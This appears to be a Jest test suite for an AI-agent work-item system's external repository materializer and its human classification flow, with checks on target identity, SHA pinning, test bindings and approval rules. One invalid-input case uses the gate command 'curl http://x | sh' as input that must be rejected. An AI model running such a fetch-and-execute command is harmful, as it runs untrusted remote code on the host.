/** @jest-environment node */
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { readExternalTarget, singleItemContractRefusal, evaluateAutonomousApprovalEnvelope, type WorkIntelligenceClassificationV1 } from '@anima/core';
import type { Database } from '@anima/types';
import type { SupabaseClient } from '@supabase/supabase-js';
import {
  EXTERNAL_CLASSIFIER_ID, classifyExternalWork, createExternalWorkPrepareDeps, prepareExternalWork,
  type ExternalClassificationPort, type ExternalWorkPrepareDeps, type ExternalWorkRequest,
} from './external-work-materializer';
import { defaultExternalTargetDeps, EXTERNAL_TARGET_ENV, verifyExternalTargetForContract, type ExternalTargetDeps } from './external-target-resolver';
import { readExecutionContract } from './executor-selection';
import { ensurePlannedProjectClassification } from './planned-project-classification';

// Repositórios 100% descartáveis em tmpdir; persistência por doubles (nada toca o banco residente).
jest.setTimeout(60_000);
const sandboxes: string[] = [];
afterAll(() => { for (const dir of sandboxes) rmSync(dir, { recursive: true, force: true }); });
const git = (cwd: string, ...args: string[]): string => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', ...args], { cwd, encoding: 'utf8', windowsHide: true }).trim();
const CART_TEST = "describe('carrinho', () => {\n  test('soma os itens', () => {});\n  test('ignora itens sem preço', () => {});\n});\n";
function makeRepo(name: string, extra: Record<string, string> = {}): { root: string; rootSha: string; headSha: string; firstSha: string } {
  const base = mkdtempSync(join(tmpdir(), 't2-ext-')); sandboxes.push(base);
  mkdirSync(join(base, name));
  const root = realpathSync.native(join(base, name));
  git(root, 'init', '-q', '-b', 'main');
  for (const [path, content] of Object.entries({ 'a.txt': 'a', 'src/cart.test.js': CART_TEST, ...extra })) { mkdirSync(join(root, path, '..'), { recursive: true }); writeFileSync(join(root, path), content); }
  git(root, 'add', '-A'); git(root, 'commit', '-q', '-m', 'c0');
  const firstSha = git(root, 'rev-parse', 'HEAD');
  writeFileSync(join(root, 'b.txt'), 'b'); git(root, 'add', '-A'); git(root, 'commit', '-q', '-m', 'c1');
  return { root, rootSha: git(root, 'rev-list', '--max-parents=0', 'HEAD'), headSha: git(root, 'rev-parse', 'HEAD'), firstSha };
}
const fakeAnima = () => makeRepo('fake-anima', { 'package.json': '{}', 'apps/web/package.json': '{}' });
const envFor = (reference: string, repoRoot: string, rootCommitSha: string): Record<string, string> => ({ [EXTERNAL_TARGET_ENV]: JSON.stringify({ reference, repoRoot, rootCommitSha }) });

const request = (extra: Partial<ExternalWorkRequest> = {}): ExternalWorkRequest => ({
  reference: 'ext:shop', objective: 'Adicionar total() ao carrinho', scope: ['src/cart.ts', 'src/cart.test.js'], excluded: ['package.json'],
  acceptance: [{ id: 'A1', text: 'total() soma os itens' }, { id: 'A2', text: 'npm test passa' }],
  gates: [{ command: 'npm test', covers: ['A2'] }],
  bindings: [{ covers: ['A1'], file: 'src/cart.test.js', minNewTests: 0, boundTests: ['carrinho soma os itens', 'carrinho ignora itens sem preço'] }],
  backend: 'ollama', model: 'qwen3-coder:latest', ...extra,
});

interface Harness { deps: ExternalWorkPrepareDeps; createProposal: jest.Mock; persistSourceMessage: jest.Mock; service: { createProposal: jest.Mock } }
function harness(env: Record<string, string>, targetDeps: ExternalTargetDeps, over: Partial<ExternalWorkPrepareDeps> = {}): Harness {
  const createProposal = jest.fn(async () => ({ ok: true as const, value: { id: 'item-1' } }));
  const persistSourceMessage = jest.fn(async () => 'msg-1');
  const service = { createProposal };
  const base = createExternalWorkPrepareDeps({} as SupabaseClient<Database>, 'user', service as never, { env, targetDeps });
  return { deps: { ...base, persistSourceMessage, now: () => new Date('2026-10-25T12:00:00.000Z'), ...over }, createProposal, persistSourceMessage, service };
}
const depsWithAnima = (animaRoot: string): ExternalTargetDeps => ({ ...defaultExternalTargetDeps, animaRoot: () => animaRoot });

describe('prepareExternalWork', () => {
  test('materialização válida: UM work item proposed com identidade, base SHA, escopo, backend e gates; sem aprovar/executar', async () => {
    const ext = makeRepo('shop'); const anima = fakeAnima();
    const h = harness(envFor('ext:shop', ext.root, ext.rootSha), depsWithAnima(anima.root));
    const result = await prepareExternalWork(request(), h.deps);
    expect(result).toMatchObject({ ok: true, workItemId: 'item-1', reference: 'ext:shop', state: 'proposed', baseSha: ext.headSha, backend: 'ollama' });
    expect(h.persistSourceMessage).toHaveBeenCalledTimes(1);
    expect(h.createProposal).toHaveBeenCalledTimes(1);
    expect(Object.keys(h.service)).toEqual(['createProposal']); // o doublé nem tem approve/start/claim: nada além de propor é alcançável

    const command = (h.createProposal.mock.calls[0] as unknown[])[0] as { sourceMessageId: string; impactLevel: string; capability: string; intent: Record<string, any>; proposal: { data: Record<string, any> } };
    expect(command).toMatchObject({ sourceMessageId: 'msg-1', impactLevel: 'low', capability: 'programming' });
    const spec = command.intent['execution_spec'];
    expect(spec).toMatchObject({ executor: 'worktree', coder_backend: 'ollama', model: 'qwen3-coder:latest', base_sha: ext.headSha, verifier_requirement: 'required_fail_closed' });
    expect(spec).toMatchObject({ acceptance_contract: 2 });
    expect(spec.validation_criteria).toEqual([
      { label: 'npm test', command: 'npm test', proof: 'gate', claim_kind: 'gate_assertion', covers: ['npm test passa'] },
      { label: 'Teste vinculado: src/cart.test.js', proof: 'gate', claim_kind: 'test_binding', covers: ['total() soma os itens'], target_paths: ['src/cart.test.js'], command: 'npm test -- src/cart.test.js',
        binding: { test_files: ['src/cart.test.js'], min_new_tests: 0, bound_tests: [
          { file: 'src/cart.test.js', full_name: 'carrinho soma os itens' }, { file: 'src/cart.test.js', full_name: 'carrinho ignora itens sem preço' }] } },
    ]);
    expect(command.proposal.data).toMatchObject({ includedScope: ['src/cart.ts', 'src/cart.test.js'], expectedEffects: ['total() soma os itens', 'npm test passa'] });
    // identidade completa persistida, canônica e relida pelo contrato do T1
    const target = readExternalTarget(spec.target);
    expect(target).toEqual({ ok: true, target: { reference: 'ext:shop', identity: {
      repoRootCanonical: ext.root, gitCommonDirCanonical: realpathSync.native(join(ext.root, '.git')), rootCommitSha: ext.rootSha, baseSha: ext.headSha } } });
    expect(JSON.stringify(command)).not.toContain(realpathSync.native(anima.root)); // nenhum caminho do Anima no contrato
    // o contrato persistido passa pela verificação pré-claim do host e pela fronteira do Single-Item
    expect(await verifyExternalTargetForContract(readExecutionContract(command.intent), envFor('ext:shop', ext.root, ext.rootSha), depsWithAnima(anima.root))).toMatchObject({ ok: true, repoRoot: ext.root });
    expect(singleItemContractRefusal(command.intent)).toBeNull();
    // nunca auto-aprovável
    expect(evaluateAutonomousApprovalEnvelope({ state: 'proposed', impactLevel: 'low', capability: 'programming', intent: command.intent as never, proposal: command.proposal as never, governorVerdict: 'permit' }).authorized).toBe(false);
  });

  test('base SHA pinado (commit anterior) é respeitado; SHA inexistente ou malformado é recusado sem persistir', async () => {
    const ext = makeRepo('shop'); const anima = fakeAnima();
    const h = harness(envFor('ext:shop', ext.root, ext.rootSha), depsWithAnima(anima.root));
    expect(await prepareExternalWork(request({ baseSha: ext.firstSha }), h.deps)).toMatchObject({ ok: true, baseSha: ext.firstSha });
    const h2 = harness(envFor('ext:shop', ext.root, ext.rootSha), depsWithAnima(anima.root));
    expect(await prepareExternalWork(request({ baseSha: 'f'.repeat(40) }), h2.deps)).toMatchObject({ ok: false, rejected: true, code: 'external_target_base_sha_invalid' });
    expect(await prepareExternalWork(request({ baseSha: 'abc' }), h2.deps)).toMatchObject({ ok: false, rejected: true, code: 'base_sha_invalid' });
    expect(h2.persistSourceMessage).not.toHaveBeenCalled(); expect(h2.createProposal).not.toHaveBeenCalled();
  });

  test('codex-cli grava model default', async () => {
    const ext = makeRepo('shop'); const anima = fakeAnima();
    const h = harness(envFor('ext:shop', ext.root, ext.rootSha), depsWithAnima(anima.root));
    const res = await prepareExternalWork(request({ backend: 'codex-cli', model: undefined }), h.deps); expect(res).toMatchObject({ ok: true, backend: 'codex-cli' });
    const command = (h.createProposal.mock.calls[0] as unknown[])[0] as { intent: { execution_spec: { model: string; coder_backend: string } } };
    expect(command.intent.execution_spec).toMatchObject({ coder_backend: 'codex-cli', model: 'default' });
  });

  test('referência desconhecida neste host, e configuração ausente/inválida: recusadas antes de qualquer escrita', async () => {
    const ext = makeRepo('shop'); const anima = fakeAnima();
    const other = harness(envFor('ext:other', ext.root, ext.rootSha), depsWithAnima(anima.root));
    expect(await prepareExternalWork(request(), other.deps)).toMatchObject({ ok: false, rejected: true, code: 'external_target_unknown' });
    const missing = harness({}, depsWithAnima(anima.root));
    expect(await prepareExternalWork(request(), missing.deps)).toMatchObject({ ok: false, rejected: true, code: 'external_target_not_configured' });
    const bad = harness({ [EXTERNAL_TARGET_ENV]: '{"reference":"ext:shop"}' }, depsWithAnima(anima.root));
    expect(await prepareExternalWork(request(), bad.deps)).toMatchObject({ ok: false, rejected: true, code: 'external_target_config_invalid' });
    for (const h of [other, missing, bad]) { expect(h.persistSourceMessage).not.toHaveBeenCalled(); expect(h.createProposal).not.toHaveBeenCalled(); }
  });

  test('target externo disfarçado de Anima: configuração com anima, ou apontando para o próprio repositório/junction do Anima', async () => {
    const anima = fakeAnima();
    const asAnima = harness(envFor('anima', anima.root, anima.rootSha), depsWithAnima(anima.root));
    expect(await prepareExternalWork(request({ reference: 'anima' }), asAnima.deps)).toMatchObject({ ok: false, rejected: true, code: 'target_reference_invalid' });
    const same = harness(envFor('ext:shop', anima.root, anima.rootSha), depsWithAnima(anima.root));
    expect(await prepareExternalWork(request(), same.deps)).toMatchObject({ ok: false, rejected: true, code: 'external_target_is_anima' });
    const via = mkdtempSync(join(tmpdir(), 't2-junc-')); sandboxes.push(via); symlinkSync(anima.root, join(via, 'alias'), 'junction');
    const junction = harness(envFor('ext:shop', join(via, 'alias'), anima.rootSha), depsWithAnima(anima.root));
    expect(await prepareExternalWork(request(), junction.deps)).toMatchObject({ ok: false, rejected: true, code: 'external_target_is_anima' });
    for (const h of [asAnima, same, junction]) expect(h.createProposal).not.toHaveBeenCalled();
  });

  test('sem fallback para projectRoot(): raiz do Anima não comprovada ⇒ recusa; .git redirecionado ⇒ recusa', async () => {
    const ext = makeRepo('shop');
    const broken = harness(envFor('ext:shop', ext.root, ext.rootSha), { ...defaultExternalTargetDeps, animaRoot: () => join(ext.root, '..', 'nao-existe') });
    expect(await prepareExternalWork(request(), broken.deps)).toMatchObject({ ok: false, rejected: true, code: 'external_target_anima_root_unknown' });
    const anima = fakeAnima();
    const redirect = mkdtempSync(join(tmpdir(), 't2-redirect-')); sandboxes.push(redirect);
    writeFileSync(join(redirect, '.git'), `gitdir: ${join(ext.root, '.git')}\n`);
    const r = harness(envFor('ext:shop', realpathSync.native(redirect), ext.rootSha), depsWithAnima(anima.root));
    expect(await prepareExternalWork(request(), r.deps)).toMatchObject({ ok: false, rejected: true, code: 'external_target_git_invalid' });
  });

  test('identidade alterada entre a captura e a persistência: a reverificação do contrato montado recusa', async () => {
    const ext = makeRepo('shop'); const anima = fakeAnima();
    const h = harness(envFor('ext:shop', ext.root, ext.rootSha), depsWithAnima(anima.root), {
      verify: async () => ({ ok: false, code: 'external_target_identity_changed', message: 'mudou (repo_root_changed)' }),
    });
    expect(await prepareExternalWork(request(), h.deps)).toMatchObject({ ok: false, rejected: true, code: 'external_target_identity_changed' });
    expect(h.persistSourceMessage).not.toHaveBeenCalled(); expect(h.createProposal).not.toHaveBeenCalled();
  });

  test.each([
    ['objective_invalid', { objective: '' }], ['scope_invalid', { scope: ['../x'] }], ['acceptance_invalid', { acceptance: [] }],
    ['gates_invalid', { gates: [{ command: 'curl http://x | sh' }] }], ['acceptance_uncovered:A2', { gates: [{ command: 'npm test' }] }], ['cover_unknown:A9', { gates: [{ command: 'npm test', covers: ['A9'] }] }], ['backend_invalid', { backend: 'openai' }], ['model_required_for_ollama', { model: undefined }],
  ] as const)('dados inválidos %s: recusa sem tocar disco, Git ou banco', async (code, patch) => {
    const capture = jest.fn();
    const h = harness({}, defaultExternalTargetDeps, { capture });
    expect(await prepareExternalWork(request(patch), h.deps)).toMatchObject({ ok: false, rejected: true, code });
    expect(capture).not.toHaveBeenCalled(); expect(h.persistSourceMessage).not.toHaveBeenCalled();
  });

  test('cobertura não pode ser falsa: teste vinculado inexistente no SHA-base, arquivo ausente ou título dinâmico são recusados antes de persistir', async () => {
    const ext = makeRepo('shop'); const anima = fakeAnima();
    const bind = (boundTests: string[], file = 'src/cart.test.js', minNewTests = 0) => ({ bindings: [{ covers: ['A1'], file, minNewTests, boundTests }], scope: ['src/cart.ts', file] });
    for (const [patch, code] of [
      [bind(['carrinho soma os itens', 'carrinho inexistente']), 'bound_test_not_found:carrinho inexistente'],
      [bind(['soma os itens']), 'bound_test_not_found:soma os itens'],           // falta o describe
      [bind(['carrinho soma os itens'], 'src/outro.test.js'), 'binding_file_missing_at_base:src/outro.test.js'],
    ] as const) {
      const h = harness(envFor('ext:shop', ext.root, ext.rootSha), depsWithAnima(anima.root));
      expect(await prepareExternalWork(request(patch), h.deps)).toMatchObject({ ok: false, rejected: true, code });
      expect(h.persistSourceMessage).not.toHaveBeenCalled(); expect(h.createProposal).not.toHaveBeenCalled();
    }
  });

  test('arquivo de teste NOVO com min_new_tests ≥ 1 e sem testes vinculados é permitido (nada a conferir no base)', async () => {
    const ext = makeRepo('shop'); const anima = fakeAnima();
    const h = harness(envFor('ext:shop', ext.root, ext.rootSha), depsWithAnima(anima.root));
    const patch = { bindings: [{ covers: ['A1'], file: 'src/novo.test.js', minNewTests: 1, boundTests: [] }], scope: ['src/cart.ts', 'src/novo.test.js'] };
    expect(await prepareExternalWork(request(patch), h.deps)).toMatchObject({ ok: true });
  });

  test('revisão humana: critério com `--review` vira prova human_review (pendência, nunca prova automática)', async () => {
    const ext = makeRepo('shop'); const anima = fakeAnima();
    const h = harness(envFor('ext:shop', ext.root, ext.rootSha), depsWithAnima(anima.root));
    const patch = { acceptance: [{ id: 'A1', text: 'total() soma os itens' }, { id: 'A2', text: 'npm test passa' }, { id: 'A3', text: 'sem enfraquecer testes' }], reviews: ['A3'] };
    expect(await prepareExternalWork(request(patch), h.deps)).toMatchObject({ ok: true });
    const spec = ((h.createProposal.mock.calls[0] as unknown[])[0] as { intent: { execution_spec: { validation_criteria: Record<string, unknown>[] } } }).intent.execution_spec;
    expect(spec.validation_criteria.at(-1)).toEqual({ label: 'Revisão humana: sem enfraquecer testes', proof: 'human_review', covers: ['sem enfraquecer testes'] });
  });

  test('falha de persistência é erro operacional (não rejeição) e informa mensagem órfã; falha da mensagem de origem não cria proposta', async () => {
    const ext = makeRepo('shop'); const anima = fakeAnima();
    const failing = harness(envFor('ext:shop', ext.root, ext.rootSha), depsWithAnima(anima.root));
    failing.createProposal.mockResolvedValue({ ok: false, error: { code: 'boom', message: 'rpc recusou' } } as never);
    expect(await prepareExternalWork(request(), failing.deps)).toMatchObject({ ok: false, rejected: false, code: 'proposal_persist_failed', orphanSourceMessageId: 'msg-1' });
    const noMessage = harness(envFor('ext:shop', ext.root, ext.rootSha), depsWithAnima(anima.root), { persistSourceMessage: async () => null });
    expect(await prepareExternalWork(request(), noMessage.deps)).toMatchObject({ ok: false, rejected: false, code: 'source_message_persist_failed' });
    expect(noMessage.createProposal).not.toHaveBeenCalled();
  });
});

// ─── Classificação humana explícita ───────────────────────────────────────────

describe('classifyExternalWork', () => {
  const AXES = { complexity: 'bounded', risk: 'low', reversibility: 'reversible', planClarity: 'clear', urgency: 'normal' };
  async function externalIntent(): Promise<unknown> {
    const ext = makeRepo('shop'); const anima = fakeAnima();
    const h = harness(envFor('ext:shop', ext.root, ext.rootSha), depsWithAnima(anima.root));
    await prepareExternalWork(request(), h.deps);
    return ((h.createProposal.mock.calls[0] as unknown[])[0] as { intent: unknown }).intent;
  }
  const portFor = (item: { state: string; proposalVersion: number; intent: unknown } | null, current: unknown = null) => {
    const record = jest.fn(async () => ({ ok: true as const, replayed: false }));
    const port: ExternalClassificationPort = { readItem: async () => item, readCurrent: async () => ({ ok: true, classification: current }), record };
    return { port, record };
  };
  const NOW = () => new Date('2026-10-25T12:00:00.000Z');
  const input = { workItemId: 'w1', expectedProposalVersion: 1, axes: AXES };

  test('item externo aprovado: grava human_confirmed com os cinco eixos informados, no revision 0', async () => {
    const { port, record } = portFor({ state: 'approved', proposalVersion: 1, intent: await externalIntent() });
    expect(await classifyExternalWork(port, input, NOW)).toEqual({ ok: true, workItemId: 'w1', proposalVersion: 1, replayed: false });
    const arg = (record.mock.calls[0] as unknown[])[0] as { classification: WorkIntelligenceClassificationV1; proposalVersion: number };
    expect(arg.proposalVersion).toBe(1);
    expect(arg.classification).toEqual({ schemaVersion: 1, ...AXES, provenance: { kind: 'human_confirmed', classifiedAt: '2026-10-25T12:00:00.000Z', classifierId: EXTERNAL_CLASSIFIER_ID } });
  });

  test.each([
    ['proposed (ainda não aprovado)', { state: 'proposed', proposalVersion: 1 }, 'not_approved'],
    ['versão divergente', { state: 'approved', proposalVersion: 2 }, 'proposal_version_changed'],
  ])('recusa: %s', async (_n, item, code) => {
    const { port, record } = portFor({ ...item, intent: await externalIntent() });
    expect(await classifyExternalWork(port, input, NOW)).toMatchObject({ ok: false, code, rejected: true });
    expect(record).not.toHaveBeenCalled();
  });

  test('item ausente e item que NÃO é trabalho externo materializado (ex.: anima) são recusados', async () => {
    const missing = portFor(null);
    expect(await classifyExternalWork(missing.port, input, NOW)).toMatchObject({ ok: false, code: 'work_item_not_found' });
    const anima = portFor({ state: 'approved', proposalVersion: 1, intent: { execution_spec: { target: { kind: 'project', reference: 'anima' }, executor: 'worktree' } } });
    expect(await classifyExternalWork(anima.port, input, NOW)).toMatchObject({ ok: false, code: 'not_external_work' });
    expect(anima.record).not.toHaveBeenCalled();
  });

  test('eixos: valor fora do domínio ou unknown são recusados antes de ler o item', async () => {
    const { port, record } = portFor({ state: 'approved', proposalVersion: 1, intent: await externalIntent() });
    const readItem = jest.spyOn(port, 'readItem');
    expect(await classifyExternalWork(port, { ...input, axes: { ...AXES, risk: 'enorme' } }, NOW)).toMatchObject({ ok: false, code: 'classification_axis_invalid' });
    expect(await classifyExternalWork(port, { ...input, axes: { ...AXES, urgency: 'unknown' } }, NOW)).toMatchObject({ ok: false, code: 'classification_axis_unknown' });
    expect(readItem).not.toHaveBeenCalled(); expect(record).not.toHaveBeenCalled();
  });

  test('classificação vigente igual ⇒ replay sem escrever; diferente ⇒ recusa (reclassificar é outro ato)', async () => {
    const intent = await externalIntent();
    const same = portFor({ state: 'approved', proposalVersion: 1, intent }, { ...AXES, schemaVersion: 1 });
    expect(await classifyExternalWork(same.port, input, NOW)).toMatchObject({ ok: true, replayed: true });
    const diff = portFor({ state: 'approved', proposalVersion: 1, intent }, { ...AXES, risk: 'high' });
    expect(await classifyExternalWork(diff.port, input, NOW)).toMatchObject({ ok: false, code: 'already_classified' });
    expect(same.record).not.toHaveBeenCalled(); expect(diff.record).not.toHaveBeenCalled();
  });

  test('falha do RPC é erro operacional', async () => {
    const { port, record } = portFor({ state: 'approved', proposalVersion: 1, intent: await externalIntent() });
    record.mockResolvedValue({ ok: false, code: '55000', message: 'versão mudou' } as never);
    expect(await classifyExternalWork(port, input, NOW)).toMatchObject({ ok: false, code: '55000', rejected: false });
  });

  test('a preparação automática do Anima (prepare-autonomous) continua NÃO se aplicando a ext:* — sem ampliar a classificação automática', async () => {
    const intent = await externalIntent();
    const row = { state: 'approved', proposal_version: 1, impact_level: 'low', capability: 'programming', intent };
    const chain: Record<string, unknown> = {};
    for (const m of ['select', 'eq']) chain[m] = () => chain;
    chain['maybeSingle'] = async () => ({ data: row, error: null });
    const rpc = jest.fn();
    const client = { from: () => chain, rpc } as unknown as SupabaseClient<Database>;
    expect(await ensurePlannedProjectClassification(client, 'w1', 1)).toMatchObject({ ok: false, code: 'classification_policy_not_applicable' });
    expect(rpc).not.toHaveBeenCalled();
  });
});

test('o existsSync usado nas fixtures é o do Node (sanidade do harness)', () => { expect(existsSync(tmpdir())).toBe(true); });
